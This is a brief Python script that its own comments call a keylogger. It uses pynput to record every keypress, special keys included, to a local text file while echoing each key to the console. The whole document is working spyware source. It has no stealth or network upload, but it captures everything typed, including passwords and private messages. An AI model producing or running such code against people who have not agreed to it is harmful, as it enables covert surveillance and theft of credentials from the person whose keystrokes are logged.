from pynput import keyboard

# Function to handle key press events
def keyPressed(key):
    print(str(key))  # Print the key for debugging purposes

    # Open the log file in append mode
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char  # Get the character representation of the key
            logkey.write(char)  # Write the character to the log file
        except AttributeError:
            # Handle special keys (e.g., shift, ctrl) by logging their names
            logkey.write(f'[{str(key)}]')

# Main function to start the keylogger
if __name__ == '__main__':
    # Set up the listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Start the listener
    input()  # Keep the program running
